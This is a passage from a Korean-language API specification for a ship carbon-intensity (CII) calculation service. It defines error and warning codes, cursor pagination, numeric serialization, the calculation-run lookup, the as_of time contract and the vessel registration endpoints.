| 401 Unauthorized | `INVALID_CREDENTIALS` | 자격 증명 오류 — 로그인 실패(없는 이메일·틀린 비밀번호가 **같은 코드·같은 문구**) · 비밀번호 변경의 현재 비밀번호 오입력(`details[].field` = `current_password`). **세션 문제가 아니다** (#902) |
| 403 Forbidden | `CSRF_ERROR` | CSRF 토큰 누락 또는 불일치 |
| 403 Forbidden | `FORBIDDEN_ROLE` | 역할이 허용하지 않는 작업 — 현장직이 사무직 전용 경로를, 또는 현장직·사무직이 관리자 전용 경로(`§1.2` 두 표)를 부름. 문구는 대상 경계에 따라 갈린다 — 사무직 전용은 `"이 작업은 사무직 권한이 있는 계정만 할 수 있습니다."`, 관리자 전용은 `"이 작업은 관리자 권한이 있는 계정만 할 수 있습니다."`(`PRD §6.3`). **CSRF와 같은 403이지만 코드가 다르다** — 화면이 `error.code`로 가를 수 있게 둔 것이다. 둘 다 **재시도하지 않고 안내로 끝낸다** (`#1366`). CSRF 토큰은 로그인 시 내려주는 `csrf` 쿠키에서만 오고 **다시 받는 경로가 없으므로**, 그 쿠키가 없거나 어긋난 상태에서는 같은 요청을 다시 보내도 결과가 같다 — 그 세션으로는 더 진행할 수 없고 **다시 로그인**해야 한다 (#672 · #1301) |
| 404 Not Found | `NOT_FOUND` | 존재하지 않는 리소스 ID |
| 404 Not Found | `NOT_FOUND` | 존재하지 않는 **경로** (프레임워크 자동 발생 — `#183`에서 §1.3.2 포맷으로 변환). 리소스 ID 미존재와 동일한 코드를 쓴다 |
| 405 Method Not Allowed | `METHOD_NOT_ALLOWED` | 경로는 존재하나 HTTP 메서드가 허용되지 않음 (프레임워크 자동 발생 — `#183`에서 변환) |
| 409 Conflict | `PARAMETER_ERROR` | 규정 파라미터 누락 또는 불일치. 재현 시 파라미터 변경 |
| 409 Conflict | `MODEL_VERSION_MISMATCH` | 재현(§6.4) 시 `model_version`이 원본과 다르고 결과도 다름 — 약속 밖의 변화(`TECH_SPEC §10.3` · #833) |
| 409 Conflict | `CONFLICT` | 리소스 중복 (예: 동일 IMO 번호 선박 재등록) |
| 422 Unprocessable Entity | `VALIDATION_ERROR` | VAL-001~010 위반. **JSON 파싱 오류**(「요청 본문이 올바른 JSON이 아닙니다.」)와 **잘못된 Content-Type**(「요청 본문 형식이 올바르지 않습니다.」)도 여기다 — `§1.3.2`가 이미 422로 서술하며, 실측도 같다 (`#1366`) |
| 422 Unprocessable Entity | `CALCULATION_ERROR` | 분모 0, overflow, 음수 결과 |
| 422 Unprocessable Entity | `MODEL_BREAKDOWN_ERROR` | BN > 8, ΔV/V ≥ 100% |
| 422 Unprocessable Entity | `STATE_TRANSITION_ERROR` | 허용되지 않은 상태 전환 (PRD §8.1.1) |
| 422 Unprocessable Entity | `WEATHER_FETCH_ERROR` | ⚠️ **지금은 나가지 않는다** (`#1347`). fallback을 거부하는 요청 옵션이 없어 `services/weather.py`의 `resolve_with_fallback`이 항상 **200 + `WEATHER_NONE_FALLBACK`**으로 이어 간다. 코드는 남겨 둔다 — 그 옵션이 생기면 이 자리가 그대로 쓰인다 |
| 429 Too Many Requests | `RATE_LIMIT_EXCEEDED` | 분당 요청 한도 초과 |
| 500 Internal Server Error | `INTERNAL_ERROR` | 서버 내부 오류 |
| 503 Service Unavailable | `CHAT_UNAVAILABLE` | 챗봇을 쓸 수 없다 — **`LLM_API_KEY` 미설정**일 때만이다 (`§15.4` · `#1365` 정정). **`/chat`에서만 난다** (`§15` · `PRD §16.2` 장애 격리: 챗봇이 죽어도 계산·보고 경로는 영향받지 않는다).<br>⚠️ **외부 모델 호출 실패는 503이 아니라 200 + `discarded: true`**다 (`§15.2`) — 그쪽이 장애 격리의 내용이다. 종전 이 행이 둘을 함께 적어 `§15.2`·`§15.4`·구현과 어긋나 있었고, 라우트의 `except LLMUnavailableError`는 상위 타입이 먼저 잡혀 **도달할 수 없었다** |
| 500 Internal Server Error | `REPRODUCIBILITY_ERROR` | canonical test vector 불일치, 재현 결과 hash 불일치 |
| 미등록 status (403·415 등) | `HTTP_ERROR` | §1.4 표에 없는 status를 만났을 때의 범용 코드 — 모든 status에 걸쳐 쓰므로 단일 status를 붙이지 않는다 (`#183`에서 변환) |

> **[#182] `HTTPException` 변환 정책** — 이 절에서 정의한 `NOT_FOUND`(경로 404)·`METHOD_NOT_ALLOWED`(405)·`HTTP_ERROR`(미등록 status) 3개 코드는 **우리가 `AppError`로 raise하지 않고, 프레임워크(Starlette/FastAPI) 자동 발생 오류와 라우트의 명시적 `HTTPException` 양쪽에 모두 적용**된다. `errors.py`의 `ERROR_HTTP_STATUS`(error_code → 단일 status 매핑)에는 **넣지 않는다** — `METHOD_NOT_ALLOWED`는 405 하나에 고정되지만 `AppError`가 아니고, `HTTP_ERROR`는 여러 status에 걸쳐 쓰여 단일 매핑이 불가능하다 (`NOT_FOUND`는 기존 리소스 ID 미존재 매핑이 그대로 쓰인다). `METHOD_NOT_ALLOWED`·`HTTP_ERROR`의 HTTP status는 **프레임워크 예외의 `status_code`를 그대로 보존**한다. 구현은 `#183`에서 담당한다.
>
> **프레임워크 발생 오류의 사용자 노출 문구 (한국어)**
>
> | status | 문구 |
> |---|---|
> | 404 (경로 없음) | `"요청한 경로를 찾을 수 없습니다."` |
> | 405 Method Not Allowed | `"허용되지 않은 HTTP 메서드입니다."` |
> | 미등록 status (403·415 등) | `"요청을 처리할 수 없습니다."` |
> | 그 외 등록 status | §1.3.2 포맷의 해당 `error_code` 문구를 따른다 |
>
> ※ 404의 경우 리소스 ID 미존재(`NOT_FOUND`)와 경로 미존재가 같은 HTTP status를 쓰므로 같은 코드 `NOT_FOUND`를 공유한다. 다만 사용자 문구는 위 표처럼 구분한다.

> **[ORACLE-C-2 정정]** 기상 API 실패 처리 경로를 두 가지로 명확히 분리했다: (1) 200 OK + `WEATHER_NONE_FALLBACK` warning (사용자가 fallback 허용), (2) 422 `WEATHER_FETCH_ERROR` (사용자가 NONE 모델 거부). 이전의 503 매핑은 제거했다.
>
> ⚠️ **⑵는 구현되지 않았다 (`#1347`).** 「사용자가 거부한다」는 **요청 옵션이 없다** — `allow_fallback`·`reject_fallback`·`strict_weather` 어느 이름으로도 코드·정본에 0건이다. 실제 동작은 늘 ⑴이며, `TECH_SPEC §12.1`도 같은 내용으로 고쳤다. 옵션을 두는 것은 **새 기능**이라 별도 판단이 필요하다.

### 1.5 페이지네이션

**여러 페이지가 될 수 있는 목록 조회 API**는 커서 기반 페이지네이션을 사용한다.

| 파라미터 | 타입 | 기본값 | 설명 |
|---|---|---|---|
| `limit` | int | 20 | 페이지 크기 (최대 100) |
| `cursor` | string | null | 이전 응답의 `meta.next_cursor` |

```json
{
  "data": [ ... ],
  "meta": {
    "next_cursor": "eyJpZCI6IjEyMzQ1NiJ9...",
    "has_more": true
  }
}
```

#### 예외 — 규모가 구조적으로 한정된 목록 [#1367]

아래 넷은 **전부 돌려주는 것이 정확한 답**이라 커서를 두지 않는다. 종전 문장(「목록 조회 API는 커서 기반」)은 이들을 규정 위반으로 만들었는데, **고칠 것은 목록이 아니라 문장이었다.**

| 목록 | 규모 | 왜 한정되는가 |
|---|---|---|
| `GET /ports/samples` (`§3.8`) | **43건 고정** | 코드 상수다. 늘어나도 사람이 적는 만큼이다 |
| `GET /vessels/samples` (`§2.15`) | **3건 고정** | 〃 |
| `GET /auth/users` (`§1.2`) | 살아 있는 계정 전부 | 관리자가 **전부 보는** 화면이다. 한 페이지만 주면 목적이 사라진다 |
| `GET /vessels/{id}/not-underway-periods` (`§2.9`) | **선박 1척**의 기록 | 경로가 이미 한 척으로 닫는다. `regulation_year`·`started_from`·`started_to`는 **선택**이라 창을 더 좁힐 뿐이고(`§2.9`), 한 척의 정박 기록은 페이지를 나눌 규모가 아니다 |

> ⚠️ **「자르면서 말하지 않는 것」은 예외가 아니다.** `§2.17.3`(감축 계획 목록)이 그 자리였다 — 20건에서 자르는데 `has_more`도 `next_cursor`도 없어, **21번째 계획을 볼 방법이 없었고** 화면에서는 「계획이 20개뿐」과 구분되지 않았다. `#1076`이 계산 이력에서 고친 것과 같은 형태다. 그 목록은 예외 표에 넣지 않고 **커서를 붙였다**.

### 1.6 Warning 코드

> **이 표가 경고 코드의 정본이다.** 모든 계산 결과 응답의 `warnings` 배열에 포함.
>
> 경고 코드는 **API 응답 필드**이고 `AGENTS §3`상 「필드·타입은 `API_SPEC` 소관」이다.
> `TECH_SPEC §12.3`은 **참조 표**로, 계산 계층에서 어떤 코드가 나오는지 보는 용도다.
> 종전에는 이 절 머리가 「`TECH_SPEC §12.3` 정의」였으나 **그 인용이 이미 성립하지
> 않았다** — 양쪽에만 있는 코드가 생겨 있었다(`#630`·`#641`). 어느 문서가 정본인지
> 판정하지 않은 채 코드를 더하면 사슬이 더 엉키므로 판정했다.

> **[ORACLE-M-4 주의]** PRD §14.2 예시의 `REFERENCE_ONLY_NOT_FOR_REGULATORY_SUBMISSION`는 TECH_SPEC §12.3에 따라 `REFERENCE_ONLY`로 정규화되었다.

| 코드 | 조건 | 사용자 메시지 |
|---|---|---|
| `REFERENCE_ONLY` | 모든 계산 결과 | 참고용 예측값입니다. 규제 제출용이 아닙니다. |
| `WEATHER_STALE` | 기상 캐시 6~24시간 | 오래된 기상 데이터를 사용 중입니다. |
| `WEATHER_NONE_FALLBACK` | 기상 API 실패, NONE 모델 사용 | 기상 보정 없이 계산했습니다. |
| `CB_ESTIMATED` | block coefficient 추정값 사용 | 선형 계수가 추정값입니다. |
| `CB_OUT_OF_RANGE` | 실측 block coefficient가 Cform 적용 범위 밖 (#966) | 이 선박의 방형계수가 기상 보정 계수의 적용 범위 밖입니다. 보정 결과는 참고값입니다. |
| `EXPERIMENTAL_MODEL` | TOWNSIN_KWON_ALPHA 사용 | 실험 모델 기반 결과입니다. |
| `NON_CII_VESSEL` | GT를 **알고** 그것이 5,000 미만 | 공식 CII 적용 대상이 아닐 수 있습니다. |
| `CII_APPLICABILITY_UNKNOWN` | `gross_tonnage`가 NULL이라 적용 대상 여부를 **판정할 수 없음** (#653) | 총톤수(GT)가 없어 공식 CII 적용 대상 여부를 판정할 수 없습니다. 선박 제원에 총톤수를 입력해 주세요. |
| `COMPLETED_NO_FUEL` | COMPLETED 항차 actual_fuel_ton NULL | 실적이 입력되지 않은 완료 항차입니다. 계획값을 임시 사용 중. |
| `COMPLETED_NO_DISTANCE` | COMPLETED 항차 actual_distance_nm NULL | 실거리가 입력되지 않은 완료 항차입니다. 계획거리를 임시 사용 중. |
| `COMPLETED_FUEL_UNFILLED` | 집계에 드는 실적 확정 항차(`INCLUDE_AS_ACTUAL`)에 `voyage_fuel_use` 행이 **한 행도 없음** — 거리만 더해지고 연료는 0이 되어 등급이 조용히 좋아진다 (#1095) | 연료 기록이 없는 실적 확정 항차가 있어 그 항차의 연료가 누적에 반영되지 않았습니다. 해당 항차에 연료를 입력해 주세요. |
| `SLOW_SPEED_FLOOR` | 기능② 감속 시나리오 속도가 최소 속도(1.0kn)에 도달 (PRD §11.2 「floor 도달 시 경고 표시」) | 감속 시나리오가 최소 속도(1.0kn)로 운항합니다. 속도 기반 연료 추정의 신뢰도가 낮습니다. |
| `SIMULATION_NO_FUEL_RATE` | 선박에 `reference_daily_foc_ton`이 없어 시뮬레이션 시계가 진행 중 항차분을 만들지 못함 (실시간 CII) | 선박에 기준 일일 연료소모량이 등록되지 않아 진행 중 항차분이 누적에 반영되지 않았습니다. 선박 제원을 입력해 주세요. |
| `SIMULATION_NO_FUEL_TYPE` | 진행 중 항차의 유종을 알 수 없어 CF를 붙일 수 없음 (항차 연료 기록도 선박 기본 연료도 없음) | 진행 중 항차의 연료 종류를 알 수 없어 진행분이 누적에 반영되지 않았습니다. 항차에 연료를 입력하거나 선박 기본 연료를 지정해 주세요. |
| `IN_PROGRESS_PAST_ETA` | 진행 중 항차가 도착 예정일을 지났고 도착 실적이 없음 (#649) | 진행 중 항차가 도착 예정일을 지났습니다. 누적은 예정일까지만 반영했으며, 도착 실적을 입력하면 확정됩니다. |
| `IN_PROGRESS_PLANNED_DISTANCE_REACHED` | 진행 중 항차의 누적 거리가 **계획 거리에 닿아 잘림** — 도착 실적이 없음 (#1321). ⚠️ **`IN_PROGRESS_PAST_ETA`와 다른 상태다**: 계획 거리는 예정일보다 **먼저** 찰 수 있다 | 진행 중 항차가 계획 거리를 모두 채웠습니다. 누적은 계획 거리까지만 반영했으며, 도착 실적을 입력하면 확정됩니다. |
| `NO_COMPLETED_VOYAGES` | 기능③ 누적 실적 없음 (PRD §12.8) | 누적 실적이 없어 현재 CII는 계산할 수 없습니다. 잔여 계획 기반 예측만 수행할 수 있습니다. |
| `NO_REMAINING_VOYAGES` | 기능③ 잔여 계획 항차 없음 (PRD §12.8) | 잔여 계획 항차가 없어 확정 실적만으로 연말 예상 등급을 산출했습니다. |
| `MANY_REMAINING_VOYAGES` | 기능③ 잔여 항차 100개 초과 (PRD §12.8 · 200개 초과는 거부) | 잔여 항차가 많아 계산 시간이 길어질 수 있습니다. |
| `SIMULATION_RUNS_CLAMPED` | 기능③ `simulation_runs`가 10,000을 넘어 상한으로 잘림 (PRD §12.8). **하한(1,000) 미만은 요청 검증에서 422**라 이 경고에 닿지 않는다(`§6.1` · #830) | 시뮬레이션 횟수를 허용 범위(1,000~10,000)로 조정했습니다. |
| `TARGET_RATING_D` | 기능③ 목표 등급이 D (PRD §12.8 · E는 거부) | 목표 등급 D는 위험 구간입니다. |
| `SENSITIVITY_ONE_AT_A_TIME` | 기능③ 민감도는 one-at-a-time이라 변수 간 상호작용 미포함 (PRD §12.8) | 각 변수의 개별 효과만 표시합니다. 복합 효과는 포함되지 않습니다. |
| `SENSITIVITY_SPEED_SKIPPED` | 기능③ 잔여 항차에 `reference_speed_kn`·`reference_daily_foc_ton`이 없어 **속도 지렛대를 산출하지 못함** (#630) | 선박 제원이 없어 속도 민감도를 산출하지 못했습니다. 표의 속도 항목은 「효과 없음」이 아니라 「계산되지 않음」입니다. |
| `SIMULATION_PLAN_NO_FUEL` | 기능③ 계획 항차에 **연료 정보가 없어** 그 항차를 연말 예상에서 제외 (#812) | 연료가 입력되지 않은 계획 항차가 있어 연말 예상에서 제외했습니다. 항차에 연료를 입력해 주세요. |
| `FUEL_CF_MASS_BASIS` | 기능③ 대체 연료 지렛대가 **질량 기준**으로 계산됨 (#756 ⑴ · `PRD §6.3`) | 연료량을 그대로 두고 배출계수만 바꿔 계산했습니다. 발열량 차이에 따른 연료량 변화는 반영되지 않았습니다. |
| `SIMULATION_NO_REFERENCE_SPEED` | 진행 중 항차의 누적 연료에 **속도 보정을 적용하지 못함** — 선박에 `reference_speed_kn`이 없음 (#796) | 기준 속도가 없어 진행 중 항차의 연료를 속도 보정 없이 계산했습니다. 선박 제원에 기준 속력을 입력해 주세요. |
| `PROJECTION_NO_REMAINING_PLAN` | 실시간 CII ⑶ 연말 예상에 더할 **잔여 계획 항차가 0건** (#798) | 잔여 계획 항차가 없어 연말 예상이 현재 누적과 같습니다. 예정 항차를 등록하면 남은 거리를 반영해 다시 계산합니다. |
| `MODEL_VERSION_DIFFERS` | 재현(§6.4)을 **원본과 다른 `model_version`**에서 돌렸는데 결과는 같았다 (#833) | 원본 실행과 다른 환경(라이브러리·엔진 버전)에서 재현했으나 결과는 같았습니다. |
| `FEEDBACK_FACTOR_UNAVAILABLE` | 기능③ `apply_feedback_factor=true`인데 확정 항차 표본이 최소(3건)보다 적어 **적용하지 않음** (`PRD §12.2.1` · #363) | 실적 보정계수를 켰지만 확정 항차가 모자라 적용하지 않았습니다. 이번 결과는 계획 연료 그대로 계산했습니다. |
| `SLOWDOWN_SKIPPED_NO_SPEED_MODEL` | 함대 감축 계획(`§2.17`)에서 기준 속력·기준 일일 연료가 없는 잔여 항차가 있어 **감속을 적용하지 못함** (#513) | 기준 속력·기준 일일 연료가 없는 잔여 항차가 있어 그 항차에는 감속을 적용하지 못했습니다. 선박 제원을 입력해 주세요. |

> **⚠️ 기능③(연간 시뮬레이션) 경고 8종은 2026-08-22에 등재했다 (#630).** 기능③이 들어온 뒤 이 표가 갱신되지 않아 **코드가 내는 17종 중 7종이 표에 없었다.** 그 결과 화면의 `WARNING_MESSAGE`(이 표를 전사한 것)에도 없어, 연간 시뮬레이션 화면이 `SENSITIVITY_ONE_AT_A_TIME` 같은 **원문 코드를 그대로 노출**하고 있었다. 문구는 `PRD §12.8` 예외 처리 표에서 옮겨 적었으며, 그 표에 문구가 없는 3종(`NO_REMAINING_VOYAGES`·`MANY_REMAINING_VOYAGES`·`SIMULATION_RUNS_CLAMPED`)만 서술된 동작에 맞춰 새로 적었다.

> **`TECH_SPEC §12.3`과의 관계 — 판정했다 (`#1095`).** 본 절이 **정본**이고 `§12.3`은 참조 표다. 종전 머리말의 「TECH_SPEC §12.3 정의」는 성립하지 않는 상태였다(양쪽에만 있는 코드가 생겼다). 두 표는 **같은 코드 집합**을 담아야 하며 `tests/test_warning_codes_sync.py`가 그것을 잠근다 — 문구까지는 대조하지 않는다.

### 1.7 수치 직렬화 정책

> **[ORACLE-C-1 추가]** TECH_SPEC의 이중 정밀도 엔진에 따라 API 응답의 수치 표현 방식을 레이어별로 구분한다.

| 레이어 | 대상 필드 | JSON 표현 | 정밀도 보장 |
|---|---|---|---|
| Layer 1 (결정론) | 결정론 계산에서 생성되거나 Decimal로 표현되는 수치 응답 (예: `attained_cii`, `required_cii`). **`parameters_used.*` · `calculation_basis.*`의 파라미터 값도 문자열이다.** | **JSON 문자열** (예: `"4.982400"`) | **[#132 정정]** 문자열로 직렬화하여 JSON float 파싱에 의한 정밀도 손실을 방지한다. 구체적인 필드 경로와 JSON 표현은 각 endpoint의 응답 계약(응답 예시 및 명시된 타입 표)을 따른다. |
| Layer 2 (Monte Carlo) | `p10`, `p50`, `p90`, `mean_cii`, `rating_probabilities.*`, `target_success_probability` | **JSON 문자열** (예: `"0.0200"`) | **[#757 정정]** 소수 4자리 고정(`TECH_SPEC §2.4` ROUND_HALF_UP). 종전 표기는 **JSON 숫자**였으나 같은 행의 「4 유효숫자」·예시 `0.0200`과 성립하지 않는다 — JSON 숫자로는 후행 0을 표현할 수 없어 `0.0200`이 `0.02`가 된다. Layer 1을 문자열로 두는 이유(파싱 정밀도 손실)가 그대로 적용되며, 구현·화면도 문자열이다 |
| 입력/CRUD | `distance_nm`, `speed_kn`, `fuel_ton`, `gross_tonnage`, `deadweight` | **JSON 숫자** (예: `1000.0`) | 사용자 입력 정밀도 |

> 클라이언트는 `parameter_hash` + `input_hash`로 결과의 무결성을 검증한다. 값 자체의 bit-exact 비교는 JSON float 파싱으로 인해 신뢰할 수 없다.

### 1.8 멱등성 (Idempotency)

> **[ORACLE-MISS-1 추가]**

계산 POST 엔드포인트 (`/calculations/voyage-cii`, `/scenarios/compare`, `/annual-simulations`)는 **항상 새 `CalculationRun`을 생성**한다. 멱등성을 강제하지 않는다.

클라이언트가 동일 입력의 이전 결과를 재사용하려면 `input_hash` + `parameter_hash`로 기존 결과를 조회한다.

CRUD 엔드포인트(PATCH, PUT, DELETE)는 HTTP 표준 멱등성을 따른다.

### 1.9 CalculationRun 조회 API

> **[EXT-P1-2]** 재현성·캐싱·디버깅을 위한 계산 결과 조회 엔드포인트.

```http
GET /api/v1/calculations
```

**쿼리 파라미터:**

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `input_hash` | string | N | `sha256:` + 64 hex chars |
| `parameter_hash` | string | N | `sha256:` + 64 hex chars |
| `type` | string | N | VOYAGE_ESTIMATE, SCENARIO, ANNUAL_DETERMINISTIC, ANNUAL_MONTE_CARLO |
| `vessel_id` | UUID | N | 선박 필터 |
| `limit` | int | N | 페이지 크기 (기본 20, 최대 100) |
| `cursor` | string | N | 페이지네이션 커서 |

> **[#1367] 값이 틀린 필터는 빈 목록이 아니라 422다.** `type`이 위 네 값 밖이거나 해시가 `sha256:` + 64자리 **소문자** 16진수가 아니면 `VALIDATION_ERROR`를 낸다(`field_label`은 각각 「종류」·「입력 해시」·「파라미터 해시」).
>
> 종전에는 검증이 없어 오타가 그대로 내려갔고, 맞는 행이 없어 **빈 목록 + `needs_recalc_total: 0`**이 돌아왔다 — **「그런 계산이 없다」와 「잘못 물었다」가 같은 화면**이 된다. 대조군인 선대 요약(`§2.16`)의 `sort`는 처음부터 422였다: 같은 저장소 안에서 두 경로가 갈려 있었다.
>
> ⚠️ **형식 검증은 존재 검증이 아니다.** 형식이 맞는 해시로 아무것도 못 찾는 것은 **정상이며 200 + 빈 목록**이다. 형식이 틀린 값은 어떤 행과도 맞을 수 없어 「없다」로 읽히는 것이 문제였다.

**응답 (200 OK):**

```json
{
  "data": [
    {
      "calculation_run_id": "uuid",
      "calculation_type": "VOYAGE_ESTIMATE",
      "vessel_id": "uuid",
      "voyage_id": "uuid",
      "input_hash": "sha256:a1b2c3d4...",
      "parameter_hash": "sha256:e5f6g7h8...",
      "model_version": { ... },
      "result_summary": {
        "attained_cii": "4.982400",
        "estimated_rating": "C"
      },
      "needs_recalc": false,
      "created_at": "2026-07-03T12:00:00Z"
    }
  ],
  "meta": {
    "next_cursor": "...",
    "has_more": true,
    "needs_recalc_total": 3
  }
}
```

**`meta` 필드:**

| 필드 | 타입 | 의미 |
|---|---|---|
| `next_cursor` | string \| null | 다음 페이지 커서. 다음 페이지가 있을 때만 채운다 |
| `has_more` | bool | 다음 페이지 존재 여부 |
| `needs_recalc_total` | int | **같은 필터에서 `needs_recalc`가 켜진 계산 수.** 이 페이지가 아니라 필터 전체의 값이며 커서를 넘겨도 변하지 않는다 |

> `input_hash` + `parameter_hash` 모두 지정 시 정확히 일치하는 계산 결과를 반환. 재현성 검증에 사용.
>
> `needs_recalc` — 선박 제원(DWT/GT · 선종) 변경 시 `true`로 플립된다(PRD §8.4 · #283 · #944). 계산 결과 자체는 immutable이라 바뀌지 않는다. `false`로 되돌아가는 일은 없다.
>
> **[#992] 선박 상세의 「계산 이력」이 이 플래그를 표시한다.** ~~[#776 정정] 이 플래그를 표시하는 화면은 없다~~ — `#776`이 이 엔드포인트를 「화면에 연결하지 않는다」로 판정했으나 2026-09-11 결정 3-② 「범위 밖은 없다」로 뒤집혔다. 선박 상세가 `vessel_id`로 최신 20건씩 받아 **「재계산 필요」 배지**와 건수를 보인다. 다시 계산하는 버튼은 두지 않는다 — 계산은 각 화면에서 새로 실행한다. 이 플래그가 켜지는 자리는 선박 제원 변경(`#283`·`#944`)과 **귀속된 항차의 계획 변경**(`#817`)이다.
>
> **[#1076] 건수는 `meta.needs_recalc_total`이다 — 화면이 받은 페이지를 세지 않는다.** 화면은 최신 20건씩 받는데 종전에는 그 20건만 세어, **21번째 행부터 낡아 있어도 머리에 「0건」이 나갔다.** 「낡은 계산이 없다」와 「아직 다 세어 보지 않았다」가 같은 모양이 되는 자리였고, 사용자가 이 카드를 여는 이유(「이 배에 다시 돌려야 할 계산이 있나」)에 답하지 못했다. 서버가 같은 필터로 세어 내려보내며, **필터를 따라간다**(`type`을 한정하면 그 종류만 센다). 화면은 이 값이 없으면 **건수를 적지 않는다** — 받은 행으로 대신 세는 것이 바로 위 결함이다.

### 1.10 `as_of` 공통 계약 — 시각 의존 계산 (#368)

> 정본 근거는 `TECH_SPEC §5.4.1`이다. 여기에는 **API 표면의 규약**만 적는다.

`PRD §1 COR-5`가 MVP에서 AIS·IoT 연동을 제외하므로 값이 저절로 변하지 않는다. 「실시간 CII」는 서버의 **시뮬레이션 시계**가 시각으로부터 누적량을 만들어 성립시키며, 그때 재현성을 지키는 장치가 `as_of`다.

**요청**

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `as_of` | string (ISO 8601, UTC) | 아니오 | 계산 기준 시각. 미지정 시 서버가 현재 시각을 확정한다 |

```http
GET /vessels/{id}/cii/current?as_of=2026-08-15T15:00:00Z
```

**응답** — 시각 의존 엔드포인트는 `meta.as_of`에 **실제 사용한 값을 반드시 포함**한다.

```json
{
  "data": { "...": "..." },
  "meta": {
    "as_of": "2026-08-15T15:00:00Z",
    "simulated": true
  }
}
```

| 필드 | 의미 |
|---|---|
| `meta.as_of` | 이 응답을 만든 기준 시각. **이 값으로 다시 요청하면 같은 결과가 나온다** |
| `meta.simulated` | 시뮬레이션 시계가 만든 값인지. `true`면 화면은 「시뮬레이션 데이터」 배지를 표시한다(`PRD R-5`). 실적이 확정된 구간은 `false` |

**보장**

1. **같은 `as_of` + 같은 입력 → 항상 같은 결과** (`TECH_SPEC §5.4` 1항).
2. `as_of`는 `input_hash`에 포함된다. `as_of`가 다르면 **다른 계산**이며, 이는 §5.4 2항이 규정한 의도된 동작이다.
3. `as_of`를 넘기지 않는 기존 엔드포인트(기능① `/calculations/voyage-cii` 등)의 `input_hash`는 이 계약 도입으로 **달라지지 않는다** — 해시 필터가 입력에 존재하는 키만 담기 때문이다.

**오류**

| 상황 | 응답 |
|---|---|
| `as_of` 형식이 ISO 8601이 아님 | `422` · `VALIDATION_ERROR` (§1.4) |

> `as_of`가 미래이거나 출항 이전인 것 자체는 오류가 아니다. 진행량이 0이 되거나 도착 시각에서 멈출 뿐이며, 경계 처리는 `TECH_SPEC §5.4.1`의 표를 따른다.

---

## 2. Vessel API

### 2.1 선박 목록 조회

```http
GET /api/v1/vessels?limit=20&cursor={cursor}
```

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `limit` | int | N | 페이지 크기 (기본 20, 최대 100) |
| `cursor` | string | N | 페이지네이션 커서 |
| `ship_type` | string | N | 선종 필터 |
| `search` | string | N | 선박명 또는 IMO 번호 검색 |

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "id": "uuid",
      "imo_number": "1234567",
      "name": "Pacific Star",
      "ship_type": "BULK_CARRIER",
      "gross_tonnage": 25000.0,
      "deadweight": 50000.0,
      "default_fuel_type": "HFO",
      "reference_speed_kn": 14.0,
      "reference_daily_foc_ton": 35.0,
      "block_coefficient": 0.82,
      "call_sign": "HLXQ",
      "is_cii_applicable_hint": true,
      "underway_state": "UNDER_WAY",
      "detail_status": "SAILING",
      "current_lat": 35.1,
      "current_lon": 129.04,
      "position_updated_at": "2026-08-15T06:00:00Z",
      "created_at": "2026-07-01T00:00:00Z",
      "updated_at": "2026-07-01T00:00:00Z"
    }
  ],
  "meta": {
    "next_cursor": null,
    "has_more": false,
    "request_id": "uuid",
    "timestamp": "2026-07-03T12:00:00Z"
  }
}
```

### 2.2 선박 상세 조회

```http
GET /api/v1/vessels/{vessel_id}
```

#### 응답 (200 OK)

§2.1의 단일 선박 객체와 동일.

#### 오류

| Status | Code | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않는 vessel_id |

### 2.3 선박 등록

```http
POST /api/v1/vessels
```

#### 요청 Body

```json
{
  "imo_number": "1234567",
  "name": "Pacific Star",
  "ship_type": "BULK_CARRIER",
  "gross_tonnage": 25000.0,
  "deadweight": 50000.0,
  "default_fuel_type": "HFO",
  "reference_speed_kn": 14.0,
  "reference_daily_foc_ton": 35.0,
  "block_coefficient": 0.82,
  "call_sign": "HLXQ"
}
```

#### 검증 규칙

| 필드 | 규칙 | 오류 코드 |
|---|---|---|
| `imo_number` | 7자리 숫자 (VAL-003) | VAL-003 |
| `name` | 1~100자 | VAL-001 |
| `ship_type` | 파라미터 테이블 존재 (VAL-004) | VAL-004 |
| `gross_tonnage` | > 0 (VAL-002) · **0.01 ~ 9,999,999,999.99** | VAL-002 |
| `deadweight` | > 0 (VAL-002) · **0.01 ~ 9,999,999,999.99** | VAL-002 |
| `reference_speed_kn` | > 0 (VAL-002), 지정 시 · **0.01 ~ 9,999.99** | VAL-002 |
| `reference_daily_foc_ton` | > 0 (VAL-002), 지정 시 · **0.01 ~ 999,999.99** | VAL-002 |
| `block_coefficient` | 선택 · **0.001 ~ 1** (#966 — 체적 비율은 1을 넘지 않는다) | VAL-002 |
| `call_sign` | 선택 · **영문 대문자·숫자 4~7자**, 앞 두 글자가 모두 숫자일 수 없음 (#1197 — ITU RR No.19.55 · No.19.50). 서버가 앞뒤 공백을 지우고 대문자로 접어 저장하며, 접은 뒤 빈 값은 미기록(`null`) | VAL-011 |

> **[#966] `block_coefficient`는 기상 보정(Townsin–Kwon)의 선형 계수다.** 넣으면 실측값으로
> 계산하고, 생략하면 선종 기본값 + `CB_ESTIMATED` 경고가 계약이다. 실측값이 Cform 적용
> 범위(`TECH_SPEC §3.3.3`) 밖이면 `CB_OUT_OF_RANGE`가 나지만 **거부가 아니다** — 참고값임을
> 알리는 경고다.

> **[#1197] `call_sign`은 공공데이터 교차 대조의 키다.** `해양수산부_선박운항정보`(공공데이터포털
> `15006353`)의 입력 파라미터가 「항구 · 조회기간 · **호출부호**」라 IMO로는 질의할 수 없고, 전수
> IMO↔호출부호 레지스트리는 공공데이터에 없다(`PRD §15.1` `[#1197]` 각주). 그래서 사용자가
> 선박국적증서·무선국허가증의 값을 넣는다. **계산 입력이 아니다** — 바꿔도 재계산 표시(`§2.4`)가
> 붙지 않고 `input_hash`도 변하지 않는다. 없으면 그 배는 대조 대상이 아닐 뿐이다. 형식 검사는
> 서버 스키마·DB 트리거(`DB_SCHEMA §2.1` 마이그레이션 058)가 같은 식(`^[A-Z0-9]{4,7}$`)을 쓰며,
> 「앞 두 글자 모두 숫자 불가」만 서버가 더 본다 — 배정 관행이 나라마다 달라 세부 규칙까지 DB에
> 박으면 실재하는 부호를 거부할 수 있다. 오류 문구는 `§11` VAL-011이 정본이다.

